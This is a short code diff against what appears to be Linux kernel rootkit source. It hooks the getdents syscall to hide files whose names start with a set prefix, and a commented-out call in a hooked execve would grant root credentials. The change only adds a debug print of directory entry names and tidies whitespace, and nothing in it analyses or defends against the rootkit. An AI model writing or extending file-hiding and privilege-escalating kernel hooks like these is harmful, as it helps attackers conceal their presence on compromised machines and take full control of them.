@@ -349,7 +349,8 @@ static asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
         //printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
         //printk("inode number: %lu", d->d_ino);
         if(strlen(d->d_name) >= strlen(hide__prefix)){
-            if(strncmp(d->d_name, hide__prefix,strlen(hide__prefix)) == 0){
+printk("%s\n", d->d_name);
+            if(strncmp(d->d_name, hide__prefix, strlen(hide__prefix)) == 0){
                 //printk("Match found for prefix. Hiding from dirent entries.");
                 alteredBuffer = (((void*)(dirp)) + bytes) + d->d_reclen;
                 removedEntrySize = d->d_reclen;
@@ -370,6 +371,5 @@ static asmlinkage int new_execve(const char *pathname, char *const argv[], char 
     //commit_creds(prepare_kernel_cred(0));
     //printk("Program name hooked: %s",pathname);
     return original_execve(pathname,argv,envp);
-
 }
 
